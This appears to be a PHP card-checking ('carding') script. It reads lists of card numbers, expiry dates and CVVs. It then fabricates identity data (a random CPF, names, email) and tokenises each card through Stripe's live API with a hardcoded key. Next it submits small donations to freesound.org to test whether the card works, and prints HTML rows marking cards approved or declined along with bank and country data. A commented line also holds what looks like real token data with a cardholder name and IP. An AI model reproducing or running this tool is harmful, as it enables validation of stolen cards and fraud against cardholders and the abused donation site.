<?php


set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function dadosnome(){
	$nome = file("lista_nomes.txt");
    $mynome = rand(0, sizeof($nome)-1);
    $nome = $nome[$mynome];
	return $nome;
}
function dadossobre(){
	$sobrenome = file("lista_sobrenomes.txt");
    $mysobrenome = rand(0, sizeof($sobrenome)-1);
    $sobrenome = $sobrenome[$mysobrenome];
	return $sobrenome;

}


function email($nome){
	$email = preg_replace('<\W+>', "", $nome).rand(0000,9999)."@hotmail.com";
	return $email;
}

$cpf = cpf(1);
$nome = dadosnome();
$sobrenome = dadossobre();
$email = email($nome);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: api.stripe.com',
'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
'Accept: application/json',
'Content-Type: application/x-www-form-urlencoded',
'Referer: https://checkout.stripe.com/v3/0kKGyE0gdh2c0ou2fBLBBQ.html?distinct_id=597a6a32-fa44-fe4a-420e-a2fcdee13d14',
'Connection: keep-alive'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js/9dc17ab)&referrer=https://freesound.org/donations/donate/&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]=STEVE+REAL&time_on_page=643627&guid=NA&muid=2468b401-4232-41b9-bc01-109a9ce15144&sid=4b93e454-c35d-4b52-bb3b-472b779e3fb3&key=pk_live_htWTcZfxN3lJPdwgh6l96MdP');
$pagamento = curl_exec($ch);

$token = trim(strip_tags(getstr($pagamento,'id": "','"')));


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://freesound.org/donations/donate/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'csrfmiddlewaretoken=Sutep9y2ueIk1i42v3zW6gSQEQVF9WPnGlRHvK1axyNKwq8xeZexMxTDJEoaWgfN&id_donation_type_1=1&id_name_option='.$nome.'&id_amount=5&id_recurring=0&id_show_amount=0');
// curl_setopt($ch, CURLOPT_POSTFIELDS, 'input_2.3='.$nome.'&input_2.6='.$sobrenome.'&input_3=%28221%29+111-2311&input_4='.$email.'&input_4_2='.$email.'&input_11.1=STREET+23131231&input_11.2=&input_11.3=NY&input_11.4=New+York&input_11.5=10080&input_11.6=United+States&input_5=Select&input_8=%241.00&stripe_response=%7B%22id%22%3A%22tok_1DxFi8DtLGkQrLraeBrJ6fHJ%22%2C%22object%22%3A%22token%22%2C%22card%22%3A%7B%22id%22%3A%22card_1DxFi8DtLGkQrLraqrDhtxEp%22%2C%22object%22%3A%22card%22%2C%22address_city%22%3Anull%2C%22address_country%22%3Anull%2C%22address_line1%22%3Anull%2C%22address_line1_check%22%3Anull%2C%22address_line2%22%3Anull%2C%22address_state%22%3Anull%2C%22address_zip%22%3Anull%2C%22address_zip_check%22%3Anull%2C%22brand%22%3A%22Visa%22%2C%22country%22%3A%22MX%22%2C%22cvc_check%22%3A%22unchecked%22%2C%22dynamic_last4%22%3Anull%2C%22exp_month%22%3A4%2C%22exp_year%22%3A2022%2C%22funding%22%3A%22debit%22%2C%22last4%22%3A%222142%22%2C%22metadata%22%3A%7B%7D%2C%22name%22%3A%22MARCO+ANTONIO%22%2C%22tokenization_method%22%3Anull%7D%2C%22client_ip%22%3A%22138.219.252.86%22%2C%22created%22%3A1548603496%2C%22livemode%22%3Atrue%2C%22type%22%3A%22card%22%2C%22used%22%3Afalse%7D&stripe_credit_card_last_four=2142&stripe_credit_card_type=Visa&is_submit_4=1&gform_submit=4&gform_unique_id=5c4dd069d1172&state_4=WyJbXSIsImM4NjgwMTk3M2Y0MTJkMDcwYTM1NDJmNzhmMjZkYTZkIl0%3D&gform_target_page_number_4=0&gform_source_page_number_4=1&gform_field_values=');
$pagamento = curl_exec($ch);

$cbin = substr($cc, 0,1);
if($cbin == "5"){
$cbin = "fa fa-cc-mastercard";
}else if($cbin == "4"){
$cbin = "fa fa-cc-visa";
}else if($cbin == "3"){
$cbin = "fa fa-cc-amex";
}
$valores = array('€ 1,00','€ 5,00','€ 1,40','€ 4,80','€ 2,00','€ 7,00','€ 10,00','€ 3,00','€ 3,40','€ 5,50');
$debitouu = $valores[mt_rand(0,9)];

   if(strpos($pagamento, "You card was declined.")){ //MSG REPROVADA
 echo '<tr><td><font size="2"><font color="#FF0000"><i class="'.$cbin.'" aria-hidden="true"></i></font></font></td><td><font color="#FF0000" size="1">Reprobada 💳</font></td><td><font size="1">'.$cc.'</font></td><td><font size="1">'.$mes.'/'.$ano.'</font></td><td><font size="1">'.$cvv.'</font></td><td><font></font><font color="#FF0000" size="1">1.00$</i></font></font></td><td><font color="#FF0000" size="1">Falha Pagamento :There was a problem with your submission.';
  }	

   else{
    $bin = substr($cc, 0,6);
$binn = substr($cc, 0,6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.cardbinlist.com/search.html?bin='.$bin);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
$level     = trim(strip_tags(getstr($bin,'Card Sub Brand</th>','</td>')));
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
curl_close($ch);
$data = date("d/m/Y H:i:s");
$pais = trim(strip_tags(getstr($bin,'country":{"alpha2":"','"')));
$banco     = trim(strip_tags(getstr($bin,'"bank":{"name":"','"')));
$brand     = trim(strip_tags(getstr($bin,'"scheme":"','"')));
$fone = trim(strip_tags(getstr($bin,'"phone":"','"')));
$tipo = trim(strip_tags(getstr($bin,'},"type":"','"')));
$latitude = trim(strip_tags(getstr($bin,'latitude":',',')));
$logitude = trim(strip_tags(getstr($bin,'longitude":','}}')));
$prepago = trim(strip_tags(getstr($bin,'"prepaid":',',')));
 echo '<tr><td><font size="2"><font color="#00FF00"><i class="'.$cbin.'" aria-hidden="true"></i></font></font></td><td><font color="#00FF00" size="1">Aprovada 💳</font></td><td><font size="1">'.$cc.'</font></td><td><font size="1">'.$mes.'/'.$ano.'</font></td><td><font size="1">'.$cvv.'</font></td><td><font></font><font color="#00FF00" size="1">1.00$</font></td><td><font size="1"> Pais: '.$pais.' | Banco: '.$banco.' | Nível: '.$level.' | Tipo : '.$tipo.' </font> </td><td><font size="1">Pago: Pago autorizado</td></tr>';
  }
curl_close($ch);
ob_flush();
echo $pagamento;
?>